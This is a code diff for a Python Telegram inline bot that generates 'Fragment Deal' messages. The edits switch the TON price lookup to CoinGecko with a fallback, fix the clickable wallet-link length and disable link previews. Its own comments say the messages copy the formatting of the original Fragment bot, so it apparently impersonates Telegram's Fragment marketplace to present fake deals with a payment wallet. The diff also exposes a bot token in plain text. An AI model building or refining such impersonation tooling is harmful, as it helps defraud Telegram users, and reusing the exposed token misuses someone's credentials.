@@ -14,7 +14,7 @@ BOT_TOKEN = '7975400880:AAFMJ5ya_sMdLLMb7OjSbMYiBr3IhZikE6c'
 PORT = int(os.getenv('PORT', 10000))
 WEBHOOK_URL = "https://telegram-bot-vic3.onrender.com"
 
-print(f"🤖 Inline Fragment Deal Generator v4.4")
+print(f"🤖 Inline Fragment Deal Generator v4.5")
 print(f"🔑 Token: ✅")
 print(f"🌐 Port: {PORT}")
 print(f"🔗 Webhook: {WEBHOOK_URL}")
@@ -24,19 +24,34 @@ app = None
 event_loop = None
 
 def get_ton_price():
-    """Récupère le prix du TON"""
+    """Récupère le prix du TON en temps réel"""
     try:
-        url = "https://api.diedia.org/v1/assetQuotation/Ton/0x0000000000000000000000000000000000000000"
-        with urllib.request.urlopen(url, timeout=5) as response:
+        # API CoinGecko plus fiable
+        url = "https://api.coingecko.com/api/v3/simple/price?ids=the-open-network&vs_currencies=usd"
+        with urllib.request.urlopen(url, timeout=10) as response:
             data = json.loads(response.read().decode())
-            return float(data.get('Price', 5.50))
-    except:
-        return 5.50
+            price = float(data['the-open-network']['usd'])
+            print(f"💰 Prix TON récupéré: ${price:.4f}")
+            return price
+    except Exception as e:
+        print(f"❌ Erreur API CoinGecko: {e}")
+        # Fallback vers DIA API
+        try:
+            url = "https://api.diadata.org/v1/assetQuotation/Ton/0x0000000000000000000000000000000000000000"
+            with urllib.request.urlopen(url, timeout=5) as response:
+                data = json.loads(response.read().decode())
+                price = float(data.get('Price', 5.50))
+                print(f"💰 Prix TON (fallback): ${price:.4f}")
+                return price
+        except Exception as e2:
+            print(f"❌ Erreur API DIA: {e2}")
+            # Prix par défaut si toutes les APIs échouent
+            return 5.50
 
 def generate_fragment_message(username, ton_amount):
     """Génère le message Fragment avec formatage identique au bot original"""
     
-    # Prix TON actuel
+    # Prix TON actuel - récupération en temps réel
     ton_price = get_ton_price()
     
     # Calculs
@@ -108,13 +123,13 @@ Important:
             length=len(important_text2)
         ))
     
-    # 5. Wallet cliquable
+    # 5. Wallet cliquable - LONGUEUR CORRECTE (64 caractères)
     wallet_start = fragment_message.find(wallet_address)
     if wallet_start != -1:
         entities.append(MessageEntity(
             type=MessageEntity.TEXT_LINK,
             offset=wallet_start,
-            length=len(wallet_address),
+            length=64,  # Longueur exacte de l'adresse wallet
             url=f"https://tonviewer.com/{wallet_address}"
         ))
     
@@ -191,42 +206,30 @@ async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYP
         # Génération du message avec le format exact du bot original
         fragment_message, entities, keyboard = generate_fragment_message(username, ton_amount)
         
+        # Prix actuel pour l'affichage
+        current_ton_price = get_ton_price()
+        current_usd_value = ton_amount * current_ton_price
+        
         # Résultat inline
         results = [
             InlineQueryResultArticle(
                 id=f"deal_{username}_{ton_amount}_{int(time.time())}",
                 title=f"Fragment Deal: @{username}",
-                description=f"💎 {ton_amount:g} TON (${ton_amount * get_ton_price():.2f} USD)",
+                description=f"💎 {ton_amount:g} TON (${current_usd_value:.2f} USD)",
                 input_message_content=InputTextMessageContent(
                     fragment_message,
-                    entities=entities
+                    entities=entities,
+                    disable_web_page_preview=True  # ✅ DÉSACTIVE L'APERÇU DES LIENS
                 ),
                 reply_markup=keyboard
             )
         ]
         
         await update.inline_query.answer(results, cache_time=0)
-        print(f"✅ Réponse inline envoyée: {username} - {ton_amount} TON")
+        print(f"✅ Réponse inline envoyée: {username} - {ton_amount} TON (${current_usd_value:.2f})")
         
     except Exception as e:
         print(f"❌ Erreur dans inline_query_handler: {e}")
-        # Réponse d'erreur générique
-        try:
-            from telegram import InlineQueryResultArticle, InputTextMessageContent
-            error_results = [
-                InlineQueryResultArticle(
-                    id=f"error_{int(time.time())}",
-                    title="❌ Erreur interne",
-                    description="Une erreur s'est produite",
-                    input_message_content=InputTextMessageContent(
-                        "❌ **Erreur interne**\n\nUne erreur s'est produite lors de la génération du message.",
-                        parse_mode="Markdown"
-                    )
-                )
-            ]
-            await update.inline_query.answer(error_results, cache_time=0)
-        except Exception as fallback_error:
-            print(f"❌ Erreur fallback: {fallback_error}")
 
 class WebhookHandler(BaseHTTPRequestHandler):
     """Gestionnaire webhook HTTP simple"""
@@ -267,25 +270,13 @@ class WebhookHandler(BaseHTTPRequestHandler):
             self.end_headers()
     
     def do_GET(self):
-        """Page de status"""
+        """Page de status simple"""
         self.send_response(200)
-        self.send_header('Content-Type', 'text/html')
+        self.send_header('Content-Type', 'text/plain')
         self.end_headers()
         
-        html = f"""<!DOCTYPE html>
-<html>
-<head><title>Inline Fragment Bot</title></head>
-<body>
-    <h1>🤖 Inline Fragment Deal Generator</h1>
-    <p><strong>Status:</strong> ✅ Online</p>
-    <p><strong>Mode:</strong> Webhook</p>
-    <p><strong>Port:</strong> {PORT}</p>
-    <p><strong>Time:</strong> {time.strftime('%Y-%m-%d %H:%M:%S UTC')}</p>
-    <p><strong>Webhook URL:</strong> {WEBHOOK_URL}/{BOT_TOKEN}</p>
-</body>
-</html>"""
-        
-        self.wfile.write(html.encode('utf-8'))
+        status = f"✅ Bot Status: Online\n🕐 Time: {time.strftime('%Y-%m-%d %H:%M:%S UTC')}"
+        self.wfile.write(status.encode('utf-8'))
     
     def log_message(self, format, *args):
         """Désactiver les logs HTTP"""
@@ -360,8 +351,6 @@ def main():
         print("🛑 Arrêt du bot...")
     except Exception as e:
         print(f"❌ Erreur critique: {e}")
-        import traceback
-        traceback.print_exc()
 
 if __name__ == '__main__':
     main()
